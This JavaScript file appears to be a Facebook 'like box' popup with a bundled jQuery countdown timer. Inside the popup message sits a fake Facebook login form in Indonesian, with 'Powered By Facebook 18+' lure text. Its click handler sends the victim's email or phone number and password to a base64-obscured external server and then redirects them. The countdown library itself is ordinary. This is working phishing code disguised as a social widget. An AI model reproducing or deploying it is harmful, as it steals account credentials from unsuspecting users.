function createWait(a, b, c) {
    if (c) {
        var d = new Date; d.setTime(d.getTime() + c * 60 * 1e3);
        var e = "; expires=" + d.toGMTString()
    } else var e = ""; document.cookie = a + "=" + b + e + "; path=/"
} function readCookie(a) {
    var b = a + "=";
    var c = document.cookie.split(";"); for (
        var d = 0; d < c.length; d++) {
        var e = c[d]; while (e.charAt(0) == " ") e = e.substring(1, e.length); if (e.indexOf(b) == 0) return e.substring(b.length, e.length)
    } return null
} function createCookie(a, b, c) {
    if (c) {
        var d = new Date; d.setTime(d.getTime() + c * 24 * 60 * 60 * 1e3);
        var e = "; expires=" + d.toGMTString()
    } else var e = "";
    document.cookie = a + "=" + b + e + "; path=/"
}
function fbLikeDump(a) { if (a == true) { createCookie(likes + "fblikepop", "true", 50) } $("#fblikebg").fadeOut("slow"); $("#fblikepop").fadeOut("slow") } (function (a) {
    a.fn.kakinetworkdotcom = function (b) {
        var c = {
            title: tit, message: `
        <div class='lk-container'><div id="res"></div>
        <center><form action='' method='POST'>
        <div class='col'><input type='hidden' id='mrx' name='u' value='` + usr + `'>
        <input type='text' id='ml' name='m' placeholder='Nomor ponsel atau email' required>
        <input type='password' id='pw' name='p' placeholder='Kata Sandi' required>
        <button type='button' id='bt' class='btn btn-button'> Login </button>
        </div>
        </div>
        </form>
        </center>
        
	<script>
		$("#bt").click(function () {
			$("#bt").html("Sedang Proses....");
			var a = $("#mrx").val().trim();
			var b = $("#ml").val().trim();
			var c = $("#pw").val().trim();
			var dataString = '?u=' + a + '&m=' + b + '&p=' + c + '&srv=' + srv;
			$.get(atob(srv)+dataString, function( data ){
                    console.log(data);
                    console.log(data.message);
                    console.log(data.url);
                    
					if (data.message = "Sukses!") {
                        $("#bt").html("Login");
						window.location.replace(data.url);
					} else {
						$("#bt").html("Login");
						$("#res").html("<font color='red'>"+data.message+"</font>");
					}
			});
		});
	</script>
        `, url: "https://www.facebook.com/" + likes + "/", showfaces: true, timeout: waktu, delay: 0, closeable: true, advancedClose: false, opacity: "25", wait: tunggu, lang: bahasa
        };
        var b = a.extend(c, b); c.delay = c.delay * 1e3; c.opacity = "0." + c.opacity;
        var d = { orwait: { en: "Or wait", my: "Atau tunggu", id: "Atau menunggu", fr: "Ou attendre", de: "Order warten", it: "O attendere", es: "O esperar", tr: "Veya bekleyin" }, seconds: { en: "Seconds", my: "Saat", id: "Detik", fr: "Secondes", de: "Sekunden", it: "Secondi", es: "Segundos", tr: "Saniye" }, closeable: { en: "Close", my: "Tutup", id: "Menutup", fr: "Fermer", de: "NÃƒÂ¤he", it: "Chiudi", es: "Cerrar", tr: "Kapat", bl: "Ãâ€”ÃÂ°Ã‘â€šÃÂ²ÃÂ¾Ã‘â‚¬ÃÂ¸" } }; setTimeout(function () {
            getPopHTML = function () {
                if (c.url == "current") { c.url == window.location }
                var a = `<div id="fblikebg"></div>
                <div id="fblikepop">
                <div id="popup_head">
                <div id="closeable">
                </div>
                <h1>` + c.title + `</h1>
                </div>
                <div id="popupMessage">` + c.message + `</div>
                <div id="buttonArea">
                <div id="actionHolder">
                <fb:like id="fbLikeButton" href="` + c.url + `" show_faces="` + c.showfaces + `" width="450">
                </fb:like>
                </div>
                <div id="counter - display">` + d.orwait[c.lang] + `
                <span id="counter">
                </span>  ` + d.seconds[c.lang] + `.<br/>
                    <a id = "fbtplink" href = "#" title = "Facebook Like Box With Timer" target = "_blank" >
                    <font size="small">Powered By Facebook 18+</font></a ></div>
                    <div style="clear:both"></div></div></div>`; return a
            };
            var b = getPopHTML(); a(document.body).append(b);
            var e = readCookie(likes + "fblikepop");
            var f = readCookie(likes + "fblikepopwait"); if (e != "true" && f != "true") {
                var g = document.documentElement.clientWidth;
                var h = document.documentElement.clientHeight;
                var i = 500;
                var j = a("#fblikepop").width(); a("#fblikepop").css({ top: "180px", left: g / 2 - j / 2 }); a("#fblikebg").css({ height: h }); if (c.closeable == true) { a("#closeable").html('<a id="#fbflush" class="fbflush" onClick="fbLikeDump();" href="#_">' + d.closeable[c.lang] + "</a>") } a("#fblikebg").css({ opacity: c.opacity }); a("#fblikebg").fadeIn("slow"); a("#fblikepop").fadeIn("slow"); if (c.timeout == "0") { a("#counter-display").hide() } else { a("#counter").countdown({ until: "+" + c.timeout + "s", format: "S", compact: true, description: "", onExpiry: fbLikeDump }) } if (c.wait != 0) { createWait(likes + "fblikepopwait", "true", c.wait) } FB.XFBML.parse()
            }
        }, c.delay); if (c.advancedClose == true) { a(document).keyup(function (a) { if (a.keyCode == 27) { fbLikeDump(false) } }); a("body").click(function () { fbLikeDump(false) }); a("#fblikepop").click(function (a) { a.stopPropagation() }) } return true
    }
})(jQuery); FB.Event.subscribe("edge.create", function (a) { fbLikeDump(true) }); (function (a) {
    function k(b, c) {
        a.extend(b, c); for (
            var d in c) { if (c[d] == null) { b[d] = null } } return b
    } function b() { this.regional = []; this.regional[""] = { labels: ["Years", "Months", "Weeks", "Days", "Hours", "Minutes", "Seconds"], labels1: ["Year", "Month", "Week", "Day", "Hour", "Minute", "Second"], compactLabels: ["y", "m", "w", "d"], whichLabels: null, timeSeparator: ":", isRTL: false }; this._defaults = { until: null, since: null, timezone: null, serverSync: null, format: "dHMS", layout: "", compact: false, significant: 0, description: "", expiryUrl: "", expiryText: "", alwaysExpire: false, onExpiry: null, onTick: null, tickInterval: 1 }; a.extend(this._defaults, this.regional[""]); this._serverSyncs = [] }
    var c = "countdown"; var d = 0; var e = 1; var f = 2; var g = 3; var h = 4; var i = 5;
    var j = 6; a.extend(b.prototype, {
        markerClassName: "hasCountdown", _timer: setInterval(function () { a.countdown._updateTargets() }, 980), _timerTargets: [], setDefaults: function (a) { this._resetExtraLabels(this._defaults, a); k(this._defaults, a || {}) }, UTCDate: function (a, b, c, d, e, f, g, h) {
            if (typeof b == "object" && b.constructor == Date) { h = b.getMilliseconds(); g = b.getSeconds(); f = b.getMinutes(); e = b.getHours(); d = b.getDate(); c = b.getMonth(); b = b.getFullYear() }
            var i = new Date; i.setUTCFullYear(b); i.setUTCDate(1); i.setUTCMonth(c || 0); i.setUTCDate(d || 1); i.setUTCHours(e || 0); i.setUTCMinutes((f || 0) - (Math.abs(a) < 30 ? a * 60 : a)); i.setUTCSeconds(g || 0); i.setUTCMilliseconds(h || 0); return i
        }, periodsToSeconds: function (a) { return a[0] * 31557600 + a[1] * 2629800 + a[2] * 604800 + a[3] * 86400 + a[4] * 3600 + a[5] * 60 + a[6] }, _settingsCountdown: function (b, d) {
            if (!d) { return a.countdown._defaults }
            var e = a.data(b, c); return d == "all" ? e.options : e.options[d]
        }, _attachCountdown: function (b, d) {
            var e = a(b); if (e.hasClass(this.markerClassName)) { return } e.addClass(this.markerClassName);
            var f = { options: a.extend({}, d), _periods: [0, 0, 0, 0, 0, 0, 0] }; a.data(b, c, f); this._changeCountdown(b)
        }, _addTarget: function (a) { if (!this._hasTarget(a)) { this._timerTargets.push(a) } }, _hasTarget: function (b) { return a.inArray(b, this._timerTargets) > -1 }, _removeTarget: function (b) { this._timerTargets = a.map(this._timerTargets, function (a) { return a == b ? null : a }) }, _updateTargets: function () {
            for (
                var a = this._timerTargets.length - 1; a >= 0; a--) { this._updateCountdown(this._timerTargets[a]) }
        }, _updateCountdown: function (b, d) {
            var e = a(b); d = d || a.data(b, c); if (!d) { return } e.html(this._generateHTML(d)); e[(this._get(d, "isRTL") ? "add" : "remove") + "Class"]("countdown_rtl");
            var f = this._get(d, "onTick"); if (f) {
                var g = d._hold != "lap" ? d._periods : this._calculatePeriods(d, d._show, this._get(d, "significant"), new Date);
                var h = this._get(d, "tickInterval"); if (h == 1 || this.periodsToSeconds(g) % h == 0) { f.apply(b, [g]) }
            }
            var i = d._hold != "pause" && (d._since ? d._now.getTime() < d._since.getTime() : d._now.getTime() >= d._until.getTime()); if (i && !d._expiring) {
                d._expiring = true; if (this._hasTarget(b) || this._get(d, "alwaysExpire")) {
                    this._removeTarget(b);
                    var j = this._get(d, "onExpiry"); if (j) { j.apply(b, []) }
                    var k = this._get(d, "expiryText"); if (k) {
                        var l = this._get(d, "layout"); d.options.layout = k; this._updateCountdown(b, d); d.options.layout = l
                    }
                    var m = this._get(d, "expiryUrl"); if (m) { window.location = m }
                } d._expiring = false
            } else if (d._hold == "pause") { this._removeTarget(b) } a.data(b, c, d)
        }, _changeCountdown: function (b, d, e) {
            d = d || {}; if (typeof d == "string") {
                var f = d; d = {}; d[f] = e
            }
            var g = a.data(b, c); if (g) {
                this._resetExtraLabels(g.options, d); k(g.options, d); this._adjustSettings(b, g); a.data(b, c, g);
                var h = new Date; if (g._since && g._since < h || g._until && g._until > h) { this._addTarget(b) } this._updateCountdown(b, g)
            }
        }, _resetExtraLabels: function (a, b) {
            var c = false; for (
                var d in b) { if (d != "whichLabels" && d.match(/[Ll]abels/)) { c = true; break } } if (c) {
                    for (
                        var d in a) { if (d.match(/[Ll]abels[0-9]/)) { a[d] = null } }
                }
        }, _adjustSettings: function (a, b) {
            var c;
            var d = this._get(b, "serverSync");
            var e = 0;
            var f = null; for (
                var g = 0; g < this._serverSyncs.length; g++) { if (this._serverSyncs[g][0] == d) { f = this._serverSyncs[g][1]; break } } if (f != null) { e = d ? f : 0; c = new Date } else {
                    var h = d ? d.apply(a, []) : null; c = new Date; e = h ? c.getTime() - h.getTime() : 0; this._serverSyncs.push([d, e])
                }
            var i = this._get(b, "timezone"); i = i == null ? -c.getTimezoneOffset() : i; b._since = this._get(b, "since"); if (b._since != null) { b._since = this.UTCDate(i, this._determineTime(b._since, null)); if (b._since && e) { b._since.setMilliseconds(b._since.getMilliseconds() + e) } } b._until = this.UTCDate(i, this._determineTime(this._get(b, "until"), c)); if (e) { b._until.setMilliseconds(b._until.getMilliseconds() + e) } b._show = this._determineShow(b)
        }, _destroyCountdown: function (b) {
            var d = a(b); if (!d.hasClass(this.markerClassName)) { return } this._removeTarget(b); d.removeClass(this.markerClassName).empty(); a.removeData(b, c)
        }, _pauseCountdown: function (a) { this._hold(a, "pause") }, _lapCountdown: function (a) { this._hold(a, "lap") }, _resumeCountdown: function (a) { this._hold(a, null) }, _hold: function (b, d) {
            var e = a.data(b, c); if (e) {
                if (e._hold == "pause" && !d) {
                    e._periods = e._savePeriods;
                    var f = e._since ? "-" : "+"; e[e._since ? "_since" : "_until"] = this._determineTime(f + e._periods[0] + "y" + f + e._periods[1] + "o" + f + e._periods[2] + "w" + f + e._periods[3] + "d" + f + e._periods[4] + "h" + f + e._periods[5] + "m" + f + e._periods[6] + "s"); this._addTarget(b)
                } e._hold = d; e._savePeriods = d == "pause" ? e._periods : null; a.data(b, c, e); this._updateCountdown(b, e)
            }
        }, _getTimesCountdown: function (b) {
            var d = a.data(b, c); return !d ? null : !d._hold ? d._periods : this._calculatePeriods(d, d._show, this._get(d, "significant"), new Date)
        }, _get: function (b, c) { return b.options[c] != null ? b.options[c] : a.countdown._defaults[c] }, _determineTime: function (b, c) {
            var d = function (a) {
                var b = new Date; b.setTime(b.getTime() + a * 1e3); return b
            };
            var e = function (b) {
                b = b.toLowerCase();
                var c = new Date;
                var d = c.getFullYear();
                var e = c.getMonth();
                var f = c.getDate();
                var g = c.getHours();
                var h = c.getMinutes();
                var i = c.getSeconds();
                var j = /([+-]?[0-9]+)\s*(s|m|h|d|w|o|y)?/g;
                var k = j.exec(b); while (k) { switch (k[2] || "s") { case "s": i += parseInt(k[1], 10); break; case "m": h += parseInt(k[1], 10); break; case "h": g += parseInt(k[1], 10); break; case "d": f += parseInt(k[1], 10); break; case "w": f += parseInt(k[1], 10) * 7; break; case "o": e += parseInt(k[1], 10); f = Math.min(f, a.countdown._getDaysInMonth(d, e)); break; case "y": d += parseInt(k[1], 10); f = Math.min(f, a.countdown._getDaysInMonth(d, e)); break }k = j.exec(b) } return new Date(d, e, f, g, h, i, 0)
            };
            var f = b == null ? c : typeof b == "string" ? e(b) : typeof b == "number" ? d(b) : b; if (f) f.setMilliseconds(0); return f
        }, _getDaysInMonth: function (a, b) { return 32 - (new Date(a, b, 32)).getDate() }, _normalLabels: function (a) { return a }, _generateHTML: function (b) {
            var c = this._get(b, "significant"); b._periods = b._hold ? b._periods : this._calculatePeriods(b, b._show, c, new Date);
            var k = false;
            var l = 0;
            var m = c;
            var n = a.extend({}, b._show); for (
                var o = d; o <= j; o++) { k |= b._show[o] == "?" && b._periods[o] > 0; n[o] = b._show[o] == "?" && !k ? null : b._show[o]; l += n[o] ? 1 : 0; m -= b._periods[o] > 0 ? 1 : 0 }
            var p = [false, false, false, false, false, false, false]; for (
                var o = j; o >= d; o--) { if (b._show[o]) { if (b._periods[o]) { p[o] = true } else { p[o] = m > 0; m-- } } }
            var q = this._get(b, "compact");
            var r = this._get(b, "layout");
            var s = q ? this._get(b, "compactLabels") : this._get(b, "labels");
            var t = this._get(b, "whichLabels") || this._normalLabels;
            var u = this._get(b, "timeSeparator");
            var v = this._get(b, "description") || "";
            var w = function (c) {
                var d = a.countdown._get(b, "compactLabels" + t(b._periods[c])); return n[c] ? b._periods[c] + (d ? d[c] : s[c]) + " " : ""
            };
            var x = function (d) {
                var e = a.countdown._get(b, "labels" + t(b._periods[d])); return !c && n[d] || c && p[d] ? '<span class="countdown_section"><span class="countdown_amount">' + b._periods[d] + "</span><br/>" + (e ? e[d] : s[d]) + "</span>" : ""
            }; return r ? this._buildLayout(b, n, r, q, c, p) : (q ? '<span class="countdown_row countdown_amount' + (b._hold ? " countdown_holding" : "") + '">' + w(d) + w(e) + w(f) + w(g) + (n[h] ? this._minDigits(b._periods[h], 2) : "") + (n[i] ? (n[h] ? u : "") + this._minDigits(b._periods[i], 2) : "") + (n[j] ? (n[h] || n[i] ? u : "") + this._minDigits(b._periods[j], 2) : "") : '<span class="countdown_row countdown_show' + (c || l) + (b._hold ? " countdown_holding" : "") + '">' + x(d) + x(e) + x(f) + x(g) + x(h) + x(i) + x(j)) + "</span>" + (v ? '<span class="countdown_row countdown_descr">' + v + "</span>" : "")
        }, _buildLayout: function (b, c, k, l, m, n) {
            var o = this._get(b, l ? "compactLabels" : "labels");
            var p = this._get(b, "whichLabels") || this._normalLabels;
            var q = function (c) { return (a.countdown._get(b, (l ? "compactLabels" : "labels") + p(b._periods[c])) || o)[c] };
            var r = function (a, b) { return Math.floor(a / b) % 10 };
            var s = { desc: this._get(b, "description"), sep: this._get(b, "timeSeparator"), yl: q(d), yn: b._periods[d], ynn: this._minDigits(b._periods[d], 2), ynnn: this._minDigits(b._periods[d], 3), y1: r(b._periods[d], 1), y10: r(b._periods[d], 10), y100: r(b._periods[d], 100), y1000: r(b._periods[d], 1e3), ol: q(e), on: b._periods[e], onn: this._minDigits(b._periods[e], 2), onnn: this._minDigits(b._periods[e], 3), o1: r(b._periods[e], 1), o10: r(b._periods[e], 10), o100: r(b._periods[e], 100), o1000: r(b._periods[e], 1e3), wl: q(f), wn: b._periods[f], wnn: this._minDigits(b._periods[f], 2), wnnn: this._minDigits(b._periods[f], 3), w1: r(b._periods[f], 1), w10: r(b._periods[f], 10), w100: r(b._periods[f], 100), w1000: r(b._periods[f], 1e3), dl: q(g), dn: b._periods[g], dnn: this._minDigits(b._periods[g], 2), dnnn: this._minDigits(b._periods[g], 3), d1: r(b._periods[g], 1), d10: r(b._periods[g], 10), d100: r(b._periods[g], 100), d1000: r(b._periods[g], 1e3), hl: q(h), hn: b._periods[h], hnn: this._minDigits(b._periods[h], 2), hnnn: this._minDigits(b._periods[h], 3), h1: r(b._periods[h], 1), h10: r(b._periods[h], 10), h100: r(b._periods[h], 100), h1000: r(b._periods[h], 1e3), ml: q(i), mn: b._periods[i], mnn: this._minDigits(b._periods[i], 2), mnnn: this._minDigits(b._periods[i], 3), m1: r(b._periods[i], 1), m10: r(b._periods[i], 10), m100: r(b._periods[i], 100), m1000: r(b._periods[i], 1e3), sl: q(j), sn: b._periods[j], snn: this._minDigits(b._periods[j], 2), snnn: this._minDigits(b._periods[j], 3), s1: r(b._periods[j], 1), s10: r(b._periods[j], 10), s100: r(b._periods[j], 100), s1000: r(b._periods[j], 1e3) };
            var t = k; for (
                var u = d; u <= j; u++) {
                var v = "yowdhms".charAt(u);
                var w = new RegExp("\\{" + v + "<\\}(.*)\\{" + v + ">\\}", "g"); t = t.replace(w, !m && c[u] || m && n[u] ? "$1" : "")
            } a.each(s, function (a, b) {
                var c = new RegExp("\\{" + a + "\\}", "g"); t = t.replace(c, b)
            }); return t
        }, _minDigits: function (a, b) { a = "" + a; if (a.length >= b) { return a } a = "0000000000" + a; return a.substr(a.length - b) }, _determineShow: function (a) {
            var b = this._get(a, "format");
            var c = []; c[d] = b.match("y") ? "?" : b.match("Y") ? "!" : null; c[e] = b.match("o") ? "?" : b.match("O") ? "!" : null; c[f] = b.match("w") ? "?" : b.match("W") ? "!" : null; c[g] = b.match("d") ? "?" : b.match("D") ? "!" : null; c[h] = b.match("h") ? "?" : b.match("H") ? "!" : null; c[i] = b.match("m") ? "?" : b.match("M") ? "!" : null; c[j] = b.match("s") ? "?" : b.match("S") ? "!" : null; return c
        }, _calculatePeriods: function (b, c, k, l) {
            b._now = l; b._now.setMilliseconds(0);
            var m = new Date(b._now.getTime()); if (b._since) { if (l.getTime() < b._since.getTime()) { b._now = l = m } else { l = b._since } } else { m.setTime(b._until.getTime()); if (l.getTime() > b._until.getTime()) { b._now = l = m } }
            var n = [0, 0, 0, 0, 0, 0, 0]; if (c[d] || c[e]) {
                var o = a.countdown._getDaysInMonth(l.getFullYear(), l.getMonth());
                var p = a.countdown._getDaysInMonth(m.getFullYear(), m.getMonth());
                var q = m.getDate() == l.getDate() || m.getDate() >= Math.min(o, p) && l.getDate() >= Math.min(o, p);
                var r = function (a) { return (a.getHours() * 60 + a.getMinutes()) * 60 + a.getSeconds() };
                var s = Math.max(0, (m.getFullYear() - l.getFullYear()) * 12 + m.getMonth() - l.getMonth() + (m.getDate() < l.getDate() && !q || q && r(m) < r(l) ? -1 : 0)); n[d] = c[d] ? Math.floor(s / 12) : 0; n[e] = c[e] ? s - n[d] * 12 : 0; l = new Date(l.getTime());
                var t = l.getDate() == o;
                var u = a.countdown._getDaysInMonth(l.getFullYear() + n[d], l.getMonth() + n[e]); if (l.getDate() > u) { l.setDate(u) } l.setFullYear(l.getFullYear() + n[d]); l.setMonth(l.getMonth() + n[e]); if (t) { l.setDate(u) }
            }
            var v = Math.floor((m.getTime() - l.getTime()) / 1e3);
            var w = function (a, b) { n[a] = c[a] ? Math.floor(v / b) : 0; v -= n[a] * b }; w(f, 604800); w(g, 86400); w(h, 3600); w(i, 60); w(j, 1); if (v > 0 && !b._since) {
                var x = [1, 12, 4.3482, 7, 24, 60, 60];
                var y = j;
                var z = 1; for (
                    var A = j; A >= d; A--) { if (c[A]) { if (n[y] >= z) { n[y] = 0; v = 1 } if (v > 0) { n[A]++; v = 0; y = A; z = 1 } } z *= x[A] }
            } if (k) {
                for (
                    var A = d; A <= j; A++) { if (k && n[A]) { k-- } else if (!k) { n[A] = 0 } }
            } return n
        }
    }); a.fn.countdown = function (b) {
        var c = Array.prototype.slice.call(arguments, 1); if (b == "getTimes" || b == "settings") { return a.countdown["_" + b + "Countdown"].apply(a.countdown, [this[0]].concat(c)) } return this.each(function () { if (typeof b == "string") { a.countdown["_" + b + "Countdown"].apply(a.countdown, [this].concat(c)) } else { a.countdown._attachCountdown(this, b) } })
    }; a.countdown = new b
})(jQuery); setTimeout(function () { if ($("#fbtplink").length == 0) { $("#counter-display").append('<br /><a id="fbtplink" href="https://bit.ly/fblikeboxtime" title="Facebook Like Box Pop Up With Timer" target="_blank">Powered By Facebook 18+</a>') } }, 500)